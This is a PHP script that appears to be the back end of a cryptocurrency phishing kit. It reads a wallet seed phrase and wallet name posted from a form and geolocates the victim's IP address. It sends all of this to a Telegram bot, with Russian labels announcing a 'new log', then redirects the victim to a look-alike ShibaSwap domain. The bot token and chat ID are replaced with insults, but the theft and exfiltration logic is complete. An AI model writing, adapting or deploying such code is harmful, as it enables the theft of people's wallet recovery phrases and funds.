<?php  
  // params
  $emptyMess = '';
  $seed = $_POST['sed'];
  $namewal = $_POST['namewal'];

  // security
  if ($seed == '') {
    header('Location: ../');
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
    $NowDomen = $_SERVER['SERVER_NAME'];
    $NowCountry = file_get_contents("https://ipapi.co/$ip/country_name/");
    $NowCity = file_get_contents("https://ipapi.co/$ip/city/");
  
    // bot telegram
    $token = "F*CK u";
    $chat_id = "-BTCH";
  
    // message
    $arr = array(
      "💸 Поздравляем, новый лог!" => $emptyMess,
      "💵 Кошелёк: " => $namewal,
      "🔑 SEED Фраза: " => $seed,
      "🗻 IP: " => $ip,
      "🌍 Страна: " => $NowCountry,
      "🌇 Город: " => $NowCity,
      "🔧 Домен: " => $NowDomen
    );
  
    // foreach for array
    foreach($arr as $key => $value) {
      $txt .= "<b>".$key."</b> ".$value."%0A";
    };
  
    // sending message
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
    header('Location: https://shibaswap-www.pages.dev/');
  };
?>
